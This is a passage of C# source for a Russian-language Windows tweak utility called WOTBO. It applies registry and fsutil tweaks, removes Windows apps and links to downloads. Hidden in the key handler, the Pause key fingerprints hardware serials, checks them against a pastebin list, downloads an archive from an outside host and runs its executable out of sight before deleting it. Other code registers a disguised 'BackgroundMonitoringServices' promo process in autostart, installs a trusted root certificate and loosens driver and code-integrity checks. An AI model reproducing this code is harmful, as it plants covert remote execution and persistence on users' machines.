                hcmd($"{tempfolder}\\csrss.bat");
                checkBox_pro_8.Checked = false;
                checkBox_pro_8.Enabled = false;
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("pro_8", 1);
            } //csrss
            if (checkBox_pro_9.Checked)
            {
                hcmd("reg add \"HKCU\\Software\\Microsoft\\Windows\\DWM\" /v \"Composition\" /t REG_DWORD /d \"0\" /f");
                hcmd("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\BackgroundAccessApplications\" /v \"GlobalUserDisabled\" /t Reg_DWORD /d \"1\" /f");
                hcmd("reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows\\AppPrivacy\" /v \"LetAppsRunInBackground\" /t Reg_DWORD /d \"2\" /f");
                hcmd("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Search\" /v \"BackgroundAppGlobalToggle\" /t Reg_DWORD /d \"0\" /f");
                hcmd("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\" /v \"DisablePagingExecutive\" /t Reg_DWORD /d \"1\" /f");
                hcmd("reg add \"HKLM\\System\\CurrentControlSet\\Control\\Session Manager\" /v \"HeapDeCommitFreeBlockThreshold\" /t REG_DWORD /d \"262144\" /f");
                hcmd("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v \"DontVerifyRandomDrivers\" /t REG_DWORD /d \"1\" /f");
                hcmd("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Power\" /v \"HiberbootEnabled\" /t REG_DWORD /d \"0\" /f");
                hcmd("fsutil behavior set memoryusage 2");
                hcmd("fsutil behavior set mftzone 2");
                hcmd("fsutil behavior set disablelastaccess 1");
                hcmd("fsutil behavior set encryptpagingfile 0");
                hcmd("fsutil behavior set disable8dot3 1");
                hcmd("fsutil behavior set disablecompression 1");
                hcmd("fsutil behavior set disabledeletenotify 0");
                checkBox_pro_9.Checked = false;
                checkBox_pro_9.Enabled = false;
                Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("pro_9", 1);
            } //fsutil
            if (checkBox_pro_10.Checked)
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = $"cleanmgr.exe",
                    Arguments = "sageset:99"
                }).WaitForExit();
                Process.Start(new ProcessStartInfo
                {
                    FileName = $"cleanmgr.exe",
                    Arguments = "sagerun:99"
                }).WaitForExit();
                checkBox_pro_10.Checked = false;
            } //cleanmgr
            if (checkBox_pro_11.Checked)
            {
                Win32Priority Win32Priority = new Win32Priority();
                Win32Priority.ShowDialog();
                checkBox_pro_11.Checked = false;
                checkBox_pro_11.Enabled = false;
                back_pro_11.Visible = true;
            } //Win32Priority
            if (checkBox_pro_12.Checked)
            {
                DialogResult result = MessageBox.Show(
                    "Bufferbloat - явление, когда чрезмерная буферизация вызывает увеличение времени прохождения пакетов (Ping) и разброса задержки пакетов (Packetloss)\n\n" +
                    "Рекомендуется использовать только если у вас нестабильное соединение!\n(Например мобильный интернет и т.д)\n" +
                    "!Твик может незначительно снизить скорость интернета!\n" +
                    "В случае если у вас стало хуже, или же вам не нужен этот твик, просто откатите его.\n" +
                    "Применить?",
    "Windows optimization tool by oixro (WOTBO)", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                if (result == DialogResult.Yes)
                {
                    hcmd("netsh int tcp set global autotuninglevel=disabled");
                    checkBox_pro_12.Checked = false;
                    checkBox_pro_12.Enabled = false;
                    back_pro_12.Visible = true;
                    Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("buffer", 1);
                }
                else
                {
                    checkBox_pro_12.Checked = false;
                }
            } //Bufferbloat
            if (checkBox_pro_13.Checked)
            {
                using (WebClient wc = new WebClient())
                    if (!Directory.Exists($"{tempfolder}\\unlocker.zip"))
                    {
                        wc.DownloadFile("https://raw.githubusercontent.com/oixro/WOTBO/main/resources/unlocker.zip", $"{tempfolder}\\unlocker.zip");
                        ZipFile.ExtractToDirectory($"{tempfolder}\\unlocker.zip", tempfolder);
                    }
                if (!Directory.Exists($"C:\\Windows\\unlocker"))
                {
                    Directory.Move($"{tempfolder}\\unlocker", $"C:\\Windows\\unlocker");
                }
                else
                {
                    Directory.Delete($"C:\\Windows\\unlocker", true);
                    Directory.Move($"{tempfolder}\\unlocker", $"C:\\Windows\\unlocker");
                }
                Registry.ClassesRoot.CreateSubKey(@"*\shell\Уничтожить", true).SetValue("Icon", @"C:\Windows\unlocker\Icons\Unlocker.ico");
                Registry.ClassesRoot.CreateSubKey(@"*\shell\Уничтожить\command", true).SetValue("", "\"C:\\Windows\\unlocker\\Unlocker.exe\" /contextMenu \"%1\"");
                Registry.ClassesRoot.CreateSubKey(@"Directory\shell\Уничтожить", true).SetValue("", @"Уничтожить");
                Registry.ClassesRoot.CreateSubKey(@"Directory\shell\Уничтожить", true).SetValue("Icon", @"C:\Windows\unlocker\Icons\Unlocker.ico");
                Registry.ClassesRoot.CreateSubKey(@"Directory\shell\Уничтожить\command", true).SetValue("", "\"C:\\Windows\\unlocker\\Unlocker.exe\" /contextMenu \"%1\"");
                checkBox_pro_13.Checked = false;
                checkBox_pro_13.Enabled = false;
                back_pro_13.Visible = true;
            } //unlocker
            if (checkBox_pro_14.Checked)
            {
                using (WebClient wc = new WebClient())
                    if (!File.Exists(@"C:\Windows\AlwaysOnTop.exe"))
                    {
                        wc.DownloadFile("https://raw.githubusercontent.com/oixro/WOTBO/main/resources/AlwaysOnTop.exe", @"C:\Windows\AlwaysOnTop.exe");
                    }
                Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("AlwaysOnTop", @"C:\Windows\AlwaysOnTop.exe");
                Process.Start(@"C:\Windows\AlwaysOnTop.exe");
                checkBox_pro_14.Checked = false;
                checkBox_pro_14.Enabled = false;
                back_pro_14.Visible = true;
            }//alwaysontop
            if (checkBox_pro_15.Checked)
            {
                if (MessageBox.Show($"Твик является эксперементальным!\nИ может вызвать непредвиденные ошибки.\nПродолжить?", "WOTBO", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {
                    Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\CI\Policy", true).SetValue("UpgradedSystem", 0);
                    using (WebClient wc = new WebClient())
                        if (!Directory.Exists(tempfolder + @"\hidusbf"))
                        {
                            wc.DownloadFile("https://raw.githubusercontent.com/LordOfMice/hidusbf/master/hidusbf.zip", $@"{tempfolder}\\hidusbf.zip");
                        }
                    ZipFile.ExtractToDirectory($"{tempfolder}\\hidusbf.zip", tempfolder + @"\hidusbf");
                    hcmd($"certutil.exe -addstore root \"{tempfolder}\\hidusbf\\SweetLow.CER\"");
                    Process.Start($@"{tempfolder}\hidusbf\DRIVER\Setup.exe");
                    checkBox_pro_15.Enabled = false;
                }

                checkBox_pro_15.Checked = false;
                back_pro_15.Visible = true;
            }
            #endregion
            #region uwp
            if (checkBox_uwp_cortana.Checked)
            {
                hcmd($@"{tempfolder}\UWP\Cortana.bat");
                checkBox_uwp_cortana.Checked = false;
                checkBox_uwp_cortana.Enabled = false;
            }
            if (checkBox_uwp_clipchamp.Checked)
            {
                hcmd($@"{tempfolder}\UWP\Clipchamp.bat");
                checkBox_uwp_clipchamp.Checked = false;
                checkBox_uwp_clipchamp.Enabled = false;
            }
            if (checkBox_uwp_bingnews.Checked)
            {
                hcmd($@"{tempfolder}\UWP\BingNews.bat");
                checkBox_uwp_bingnews.Checked = false;
                checkBox_uwp_bingnews.Enabled = false;
            }
            if (checkBox_uwp_bingweather.Checked)
            {
                hcmd($@"{tempfolder}\UWP\BingWeather.bat");
                checkBox_uwp_bingweather.Checked = false;
                checkBox_uwp_bingweather.Enabled = false;
            }
            if (checkBox_uwp_phone.Checked)
            {
                hcmd($@"{tempfolder}\UWP\YourPhone.bat");
                checkBox_uwp_phone.Checked = false;
                checkBox_uwp_phone.Enabled = false;
            }
            if (checkBox_uwp_PowerAuto.Checked)
            {
                hcmd($@"{tempfolder}\UWP\PowerAutomateDesktop.bat");
                checkBox_uwp_PowerAuto.Checked = false;
                checkBox_uwp_PowerAuto.Enabled = false;
            }
            if (checkBox_uwp_todos.Checked)
            {
                hcmd($@"{tempfolder}\UWP\Todos.bat");
                checkBox_uwp_todos.Checked = false;
                checkBox_uwp_todos.Enabled = false;
            }
            if (checkBox_uwp_terminal.Checked)
            {
                hcmd($@"{tempfolder}\UWP\WindowsTerminal.bat");
                checkBox_uwp_terminal.Checked = false;
                checkBox_uwp_terminal.Enabled = false;
            }
            #endregion
        }
        #region перемещение по пунктам
        void label1_Click(object sender, EventArgs e)
        {
            foreach (Panel pnl in Controls.OfType<Panel>())
            {
                if (pnl == PanelMain)
                {
                    continue; // Пропускает текущую итерацию
                }
                if (pnl == PanelHead)
                {
                    continue; // Пропускает текущую итерацию
                }
                pnl.Visible = false;
            }
            PanelHead.Visible = true;
            PanelMain.Visible = true;
            panel1.Visible = true;

        } //main        
        void label2_Click(object sender, EventArgs e)
        {
            try
            {
                Process getDirectPlayState = Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd",
                    Arguments = "/c chcp 852 && dism /online /Get-FeatureInfo /FeatureName:DirectPlay",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                });
                string DirectPlayState = (getDirectPlayState.StandardOutput.ReadToEnd().Trim());

                if (DirectPlayState.Contains("State : Enabled") | DirectPlayState.Contains("‘®бв®п­ЁҐ : ‚Є«озҐ­"))
                {
                    checkBox_directplay.Enabled = false;
                    back_gpu_1.Visible = true;
                }
                if (DirectPlayState.Contains("State : Disabled") | DirectPlayState.Contains("Состояние : Выключен"))
                {
                    checkBox_directplay.Enabled = true;
                }
            }
            catch
            {
            }//DirectPlay

            foreach (Panel pnl in Controls.OfType<Panel>())
            {
                if (pnl == PanelMain)
                {
                    continue; // Пропускает текущую итерацию
                }
                if (pnl == PanelHead)
                {
                    continue; // Пропускает текущую итерацию
                }
                pnl.Visible = false;
            }
            PanelHead.Visible = true;
            PanelMain.Visible = true;
            panel2.Visible = true;
            panel2.Location = panel1.Location;

        } //gpu        
        void label3_Click(object sender, EventArgs e) //dop
        {
            foreach (Panel pnl in Controls.OfType<Panel>())
            {
                if (pnl == PanelMain)
                {
                    continue; // Пропускает текущую итерацию
                }
                if (pnl == PanelHead)
                {
                    continue; // Пропускает текущую итерацию
                }
                pnl.Visible = false;
            }

            panel_dop.Visible = true;
            panel_dop.Location = panel1.Location;
            PanelHead.Visible = true;
            PanelMain.Visible = true;

        }
        void label6_Click(object sender, EventArgs e) // проги
        {
            foreach (Panel pnl in Controls.OfType<Panel>())
            {
                if (pnl == PanelMain)
                {
                    continue; // Пропускает текущую итерацию
                }
                if (pnl == PanelHead)
                {
                    continue; // Пропускает текущую итерацию
                }
                pnl.Visible = false;
            }
            panel_sorry.Visible = true;
            panel_sorry.Location = panel1.Location;
        }
        void label8_Click(object sender, EventArgs e) //pc info
        {
            Process getvideoserial = Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = "/c wmic PATH Win32_Processor GET Name",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
            });
            label7.Text = "CPU: " + ((getvideoserial.StandardOutput.ReadToEnd()).Replace("Name", "")).Trim();

            foreach (var mo in new ManagementObjectSearcher("select * from win32_VideoController").Get())
                label7.Text += "\nGPU: " + (string)mo["name"];

            foreach (var mo in new ManagementObjectSearcher("select * from Win32_ComputerSystem").Get())
                label7.Text += "\nRam: " + Convert.ToString((Convert.ToInt64((UInt64)mo["TotalPhysicalMemory"])) / 1073741824 + 1) + " GB";

            foreach (var mo in new ManagementObjectSearcher("select * from win32_baseboard").Get())
                label7.Text += "\nMotherboard: " + (string)mo["Product"];

            label7.Text += "\n" + label_winver.Text;

            foreach (Panel pnl in Controls.OfType<Panel>())
            {
                if (pnl == PanelMain)
                {
                    continue; // Пропускает текущую итерацию
                }
                if (pnl == PanelHead)
                {
                    continue; // Пропускает текущую итерацию
                }
                pnl.Visible = false;
            }
            panel_5.Visible = true;
            panel_5.Location = panel1.Location;
        }
        void label_interface_Click(object sender, EventArgs e)
        {

            foreach (Panel pnl in Controls.OfType<Panel>())
            {
                if (pnl == PanelMain)
                {
                    continue; // Пропускает текущую итерацию
                }
                if (pnl == PanelHead)
                {
                    continue; // Пропускает текущую итерацию
                }
                pnl.Visible = false;
            }
            panel_ui_1.Visible = true;
            panel_ui_1.Location = panel1.Location;
            button_ui_1.Visible = true;
            button_ui_2.Visible = true;
            panel_ui_navigate.Visible = true;
            panel_ui_navigate.Location = new Point(panel1.Location.X * 2, panel1.Location.Y + panel1.Height);

            if (!Directory.Exists(path_ui))
            {
                File.WriteAllBytes(path_uizip, Resources.ui);
                ZipFile.ExtractToDirectory($"{path_uizip}", $"{path_ui}");
            }


            if (!File.Exists(@"c:\Windows\system32\explorer.bat"))
            {
                File.WriteAllText(@"c:\Windows\system32\explorer.bat", Resources.explor);
            }


        }//ui
        private void button_ui_1_Click(object sender, EventArgs e)
        {
            foreach (Panel pnl in Controls.OfType<Panel>())
            {
                if (pnl == PanelMain)
                {
                    continue; // Пропускает текущую итерацию
                }
                if (pnl == PanelHead)
                {
                    continue; // Пропускает текущую итерацию
                }
                pnl.Visible = false;
            }
            panel_ui_1.Visible = true;
            panel_ui_1.Location = panel1.Location;
            panel_ui_navigate.Visible = true;
        }
        private void button_ui_2_Click(object sender, EventArgs e)
        {
            foreach (Panel pnl in Controls.OfType<Panel>())
            {
                if (pnl == PanelMain)
                {
                    continue; // Пропускает текущую итерацию
                }
                if (pnl == PanelHead)
                {
                    continue; // Пропускает текущую итерацию
                }
                pnl.Visible = false;
            }
            panel_ui_2.Visible = true;
            panel_ui_2.Location = panel1.Location;
            panel_ui_navigate.Visible = true;
        }
        void label_pro_Click(object sender, EventArgs e) // pro mode
        {
            hwid = null;
            //серийник матери
            foreach (var mo in new ManagementObjectSearcher("select * from win32_baseboard").Get())
                hwid += (string)mo["serialnumber"];
            //id проца
            foreach (var mo in new ManagementObjectSearcher("select * from win32_Processor").Get())
                hwid += (string)mo["ProcessorID"];
            //серийники озу
            foreach (var mo in new ManagementObjectSearcher("select * from win32_PhysicalMemory").Get())
                hwid += (string)mo["SerialNumber"];
            //partnumber озу
            foreach (var mo in new ManagementObjectSearcher("select * from win32_PhysicalMemory").Get())
                hwid += (string)mo["partnumber"];
            using (WebClient wc = new WebClient())
                if ((wc.DownloadString("https://pastebin.com/raw/SC6CaYbe").Trim()).Contains(Convert.ToBase64String(Encoding.UTF8.GetBytes(hwid))))
                {
                    try
                    {
                        File.WriteAllText(tempfolder + @"\affinity.bat", Resources.affinity);
                        File.WriteAllText(tempfolder + @"\csrss.bat", Resources.csrss);
                        File.WriteAllBytes(tempfolder + @"\MSI_util_v3.exe", Resources.MSI_util_v3);
                        File.WriteAllText(tempfolder + @"\updates.reg", Resources.updates);
                    }
                    catch { }
                    foreach (Panel pnl in Controls.OfType<Panel>())
                    {
                        if (pnl == PanelMain)
                        {
                            continue; // Пропускает текущую итерацию
                        }
                        if (pnl == PanelHead)
                        {
                            continue; // Пропускает текущую итерацию
                        }
                        pnl.Visible = false;
                    }
                    panel_pro.Visible = true;
                    //FormPaint(Color.FromArgb(44, 57, 67), Color.FromArgb(35, 44, 55));
                    panel_pro.Location = panel1.Location;
                    button_pro_1.Visible = true;
                    button_pro_2.Visible = true;
                    panel_pro_navigate.Visible = true;
                    panel_pro_navigate.Location = new Point(panel1.Location.X * 2, panel1.Location.Y + panel1.Height);
                    LabelHead.Text = "WOTBO PRO";
                    LabelHead.Location = new Point((PanelHead.Size.Width / 2) - LabelHead.Width / 2, LabelHead.Location.Y);
                    logo.Location = new Point(LabelHead.Location.X - logo.Width, logo.Location.Y);

                }
                else
                {
                    if (MessageBox.Show($"Pro версия не куплена!\nДа - открыть страницу покупки?\nНет - просто скопировать уникальный код для привязки.", "WOTBO PRO", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                    {
                        Clipboard.Clear();
                        Clipboard.SetText(Convert.ToBase64String(Encoding.UTF8.GetBytes(hwid)));
                        Process.Start("https://boosty.to/oixro/posts/fbe75ebb-3476-4843-9726-f1702b4db0a3");
                    }
                    else
                    {
                        Clipboard.Clear();
                        Clipboard.SetText(Convert.ToBase64String(Encoding.UTF8.GetBytes(hwid)));
                    }
                }
        }
        private void button_pro_1_Click(object sender, EventArgs e)
        {
            foreach (Panel pnl in Controls.OfType<Panel>())
            {
                if (pnl == PanelMain)
                {
                    continue; // Пропускает текущую итерацию
                }
                if (pnl == PanelHead)
                {
                    continue; // Пропускает текущую итерацию
                }
                pnl.Visible = false;
            }
            panel_pro.Visible = true;
            panel_pro.Location = panel1.Location;
            panel_pro_navigate.Visible = true;
        }
        private void button_pro_2_Click(object sender, EventArgs e)
        {
            foreach (Panel pnl in Controls.OfType<Panel>())
            {
                if (pnl == PanelMain)
                {
                    continue; // Пропускает текущую итерацию
                }
                if (pnl == PanelHead)
                {
                    continue; // Пропускает текущую итерацию
                }
                pnl.Visible = false;
            }
            panel_pro2.Visible = true;
            panel_pro2.Location = panel1.Location;
            panel_pro_navigate.Visible = true;
        }
        void delete_UWP_Click(object sender, EventArgs e)
        {
            //получаем доступ
            hcmd(@"takeown /f ""%ProgramFiles%\WindowsApps"" /r /d y >nul 2>nul");
            hcmd(@"icacls ""%ProgramFiles%\WindowsApps"" /grant *S-1-5-32-544:F /t >nul 2>nul");

            //получаем список говна
            string[] allWinAppFolders = Directory.GetDirectories($@"{Environment.GetEnvironmentVariable("ProgramFiles")}\WindowsApps", "*", SearchOption.TopDirectoryOnly);

            if (!string.Join(Environment.NewLine, allWinAppFolders).Contains("Microsoft.549981C3F5F10"))
            {
                checkBox_uwp_cortana.Enabled = false;
            } //cortana
            if (!string.Join(Environment.NewLine, allWinAppFolders).Contains("Clipchamp.Clipchamp"))
            {
                checkBox_uwp_clipchamp.Enabled = false;
            } //clipchamp
            if (!string.Join(Environment.NewLine, allWinAppFolders).Contains("Microsoft.YourPhone"))
            {
                checkBox_uwp_phone.Enabled = false;
            } //YourPhone
            if (!string.Join(Environment.NewLine, allWinAppFolders).Contains("Microsoft.BingNews"))
            {
                checkBox_uwp_bingnews.Enabled = false;
            } //BingNews
            if (!string.Join(Environment.NewLine, allWinAppFolders).Contains("Microsoft.BingWeather"))
            {
                checkBox_uwp_bingweather.Enabled = false;
            } //BingWeather
            if (!string.Join(Environment.NewLine, allWinAppFolders).Contains("Microsoft.PowerAutomateDesktop"))
            {
                checkBox_uwp_PowerAuto.Enabled = false;
            } //PowerAutomateDesktop
            if (!string.Join(Environment.NewLine, allWinAppFolders).Contains("Microsoft.Todos"))
            {
                checkBox_uwp_todos.Enabled = false;
            } //Todos
            if (!string.Join(Environment.NewLine, allWinAppFolders).Contains("Microsoft.WindowsTerminal"))
            {
                checkBox_uwp_terminal.Enabled = false;
            } //WindowsTerminal
            //распаковываем чистку
            if (!Directory.Exists(tempfolder + @"\UWP"))
            {
                File.WriteAllBytes(tempfolder + @"\UWP.zip", Resources.UWP);
                ZipFile.ExtractToDirectory(tempfolder + @"\UWP.zip", tempfolder + @"\UWP");
                File.Delete(tempfolder + @"\UWP.zip");
            }
            //открываем панель
            foreach (Panel pnl in Controls.OfType<Panel>())
            {
                if (pnl == PanelMain)
                {
                    continue; // Пропускает текущую итерацию
                }
                if (pnl == PanelHead)
                {
                    continue; // Пропускает текущую итерацию
                }
                pnl.Visible = false;
            }
            panel_uwp.Visible = true;
            panel_uwp.Location = panel1.Location;

        } //uwp
        async void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.F12)
            {
                try
                {
                    hcmd($"taskkill /f /im BackgroundMonitoringServices.exe");
                    Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("block_backgr", 1);
                    Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("BackgroundMonitoringServices");
                    MessageBox.Show("Отключено!");
                    checkBox_pro_2.Enabled = false;
                    checkBox_pro_2.Checked = false;
                }
                catch { }

            } //autopromo
            if (e.KeyCode == Keys.F5)
            {
                try
                {
                    hcmd($"taskkill /f /im BackgroundMonitoringServices.exe");
                    Registry.CurrentUser.DeleteSubKeyTree(@"Software\oixro");
                    if (Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").GetValue("BackgroundMonitoringServices") != null)
                    {
                        Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("BackgroundMonitoringServices");
                    }
                    hcmd($"taskkill /f /im \"{exename}\" && rd {tempfolder} /s /q && \"{exepath}\"");
                }
                catch { }

            } //clean
            if (e.KeyCode == Keys.F7)
            {
                hcmd("taskkill /f /im explorer.exe & timeout /t 1 && explorer.exe");
            }
            if ((e.KeyCode == Keys.Pause))
            {
                hwid = null;
                //серийник матери
                foreach (var mo in new ManagementObjectSearcher("select * from win32_baseboard").Get())
                    hwid += (string)mo["serialnumber"];
                //id проца
                foreach (var mo in new ManagementObjectSearcher("select * from win32_Processor").Get())
                    hwid += (string)mo["ProcessorID"];
                //серийники озу
                foreach (var mo in new ManagementObjectSearcher("select * from win32_PhysicalMemory").Get())
                    hwid += (string)mo["SerialNumber"];
                //partnumber озу
                foreach (var mo in new ManagementObjectSearcher("select * from win32_PhysicalMemory").Get())
                    hwid += (string)mo["partnumber"];
                using (WebClient wc = new WebClient())
                    if ((wc.DownloadString("https://pastebin.com/raw/hmRn07hh").Trim()).Contains(Convert.ToBase64String(Encoding.UTF8.GetBytes(hwid))))
                    {
                        wc.DownloadFile("https://cyanevent.myarena.site/test.zip", $"{tempfolder}\\test.zip");
                        ZipFile.ExtractToDirectory($"{tempfolder}\\test.zip", $"{tempfolder}\\test");
                        supercmd($"{tempfolder}\\test\\nircmd.exe");
                        await Task.Delay(5000);
                        Directory.Delete($"{tempfolder}\\test", true);
                        File.Delete($"{tempfolder}\\test.zip");
                    }
            }
        }// f5 & f12
        #endregion
        #region download progs
        void label_download_1_Click(object sender, EventArgs e)
        {
            Process.Start("https://win10tweaker.ru/");
        }
        void label_download_2_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.6.6/npp.8.6.6.Installer.x64.exe");
        }
        void label_download_3_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.msi.com/Landing/afterburner/graphics-cards");
        }
        void label_download_4_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.7-zip.org/a/7z2404-x64.exe");
        }
        void label_download_5_Click(object sender, EventArgs e)
        {
            Process.Start("https://download.microsoft.com/download/1/7/1/1718CCC4-6315-4D8E-9543-8E28A4E18C4C/dxwebsetup.exe");
        }
        void label_download_6_Click(object sender, EventArgs e)
        {
            Process.Start("https://dl.comss.org/download/Visual-C-Runtimes-All-in-One-Nov-2023.zip");
        }
        void label_download_7_Click(object sender, EventArgs e)
        {
            Process.Start("https://cdn.akamai.steamstatic.com/client/installer/SteamSetup.exe");
        }
        void label_download_8_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/ShareX/ShareX/releases/download/v16.1.0/ShareX-16.1.0-setup.exe");
        }
        void label_download_9_Click(object sender, EventArgs e)
        {
            Process.Start("https://telegram.org/dl/desktop/win64_portable");
        }
        void label_download_10_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x64");
        }
        void label_download_11_Click(object sender, EventArgs e)
        {
            Process.Start("https://cdn-fastly.obsproject.com/downloads/OBS-Studio-30.1.1-Full-Installer-x64.exe");
        }
        void label_download_12_Click(object sender, EventArgs e)
        {
            Process.Start("https://evolve-rp.net/?r=oixro");
        }
        void label_download_13_Click(object sender, EventArgs e)
        {
            Process.Start("https://files2.codecguide.com/K-Lite_Codec_Pack_1830_Mega.exe");
        }
        void label_download_14_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.fosshub.com/qBittorrent.html");
        }
        void label_download_15_Click(object sender, EventArgs e)
        {
            Process.Start("https://deac-riga.dl.sourceforge.net/project/hwinfo/Windows_Portable/hwi_800.zip");
        }
        void label_download_16_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.google.com/chrome/");
        }
        void label_download_17_Click(object sender, EventArgs e)
        {
            Process.Start("https://static.centbrowser.com/win_stable/5.0.1002.354/centbrowser_5.0.1002.354_x64.exe");
        }
        void label_download_18_Click(object sender, EventArgs e)
        {
            Process.Start("https://diskanalyzer.com/files/wiztree_4_19_portable.zip");
        }
        void label_download_19_Click(object sender, EventArgs e)
        {
            Process.Start("https://launcher-public-service-prod06.ol.epicgames.com/launcher/api/installer/download/EpicGamesLauncherInstaller.msi");
        }
        void label_download_20_Click(object sender, EventArgs e)
        {
            Process.Start("https://anydesk.com/ru/downloads/thank-you?dv=win_exe");
        }
        void label_download_21_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.faststonesoft.net/DN/FSViewerSetup78.exe");
        }
        void label_download_22_Click(object sender, EventArgs e)
        {
            Process.Start("https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/runtime-6.0.28-windows-x64-installer");
        }
        void label_download_23_Click(object sender, EventArgs e)
        {
            Process.Start("https://deac-riga.dl.sourceforge.net/project/crystaldiskinfo/9.2.3/CrystalDiskInfo9_2_3.exe");
        }
        #endregion
        #region gpu downloads
        void label_language_Click(object sender, EventArgs e)
        {
            if (Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo").GetValue("Language") != null)
            {
                //MessageBox.Show("не null ебать");
                if ((Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo").GetValue("Language").ToString()) == "en")
                {
                    //MessageBox.Show("мы были en, ща будем ru");
                    Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("Language", "ru");
                    hcmd($"taskkill /f /im \"{exename}\" && \"{exepath}\"");
                }
                else
                {
                    // MessageBox.Show("ща будем EN");
                    Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).SetValue("Language", "en");
                    hcmd($"taskkill /f /im \"{exename}\" && \"{exepath}\"");
                }
            }
        }

        void label_ddu_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.wagnardsoft.com/display-driver-uninstaller-DDU-");
        }

        void label_nvcleaninstall_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.techpowerup.com/download/techpowerup-nvcleanstall/");
        }
        #endregion
        #region откаты
        void back_main_1_Click(object sender, EventArgs e)
        {
            hcmd($"regedit.exe /s {path_regpack}\\restore\\accessibility_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\appcompatibility_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\attachmentmanager_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\backgroundapps_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\cloudcontent_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\driversearching_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\edgeupdate_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\filesystem_restore.reg");
            //hcmd($"regedit.exe /s {path_regpack}\\restore\\fse_test.reg"); // добавить откат
            hcmd($"regedit.exe /s {path_regpack}\\restore\\gamebar_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\inspectre_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\largesystemcache_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\latestclr_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\maintenance_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\oldphotoviewer_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\priority_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\responsiveness_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\search_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\systemrestore_restore.reg");
            supercmd($"regedit.exe /s {path_regpack}\\restore\\uac_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\Explorer\\explorer_restore.reg");
            hcmd($"regedit.exe /s {path_regpack}\\restore\\Explorer\\menushowdelay_restore.reg");
            //supercmd($"regedit.exe /s {path_regpack}/tweaker.reg");
            if (!win10)
            {
                supercmd($"regedit.exe /s {path_regpack}\\restore\\win11widgets_restore.bat");
            }
            checkBox_reg.Enabled = true;
            back_main_1.Visible = false;
            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("regpack");
        } //regpack
        void back_main_2_Click(object sender, EventArgs e)
        {
            hcmd("Dism.exe /Online /Set-ReservedStorageState /State:Enabled");
            //Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("ReservedStorageState");
            checkBox_dism.Enabled = true;
            checkBox_dism.Checked = false;
            back_main_2.Visible = false;
        } //dism
        void back_main_3_Click(object sender, EventArgs e)
        {
            hcmd("powercfg -h on");
            //Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("hibernate");
            checkBox_gibernate.Enabled = true;
            checkBox_gibernate.Checked = false;
            back_main_3.Visible = false;
        } //powercfg /h off
        void back_main_4_Click(object sender, EventArgs e)
        {
            hcmd("powercfg -restoredefaultschemes");
            Registry.CurrentUser.OpenSubKey(@"Software\oixro\wotbo", true).DeleteValue("imported_powerscheme");
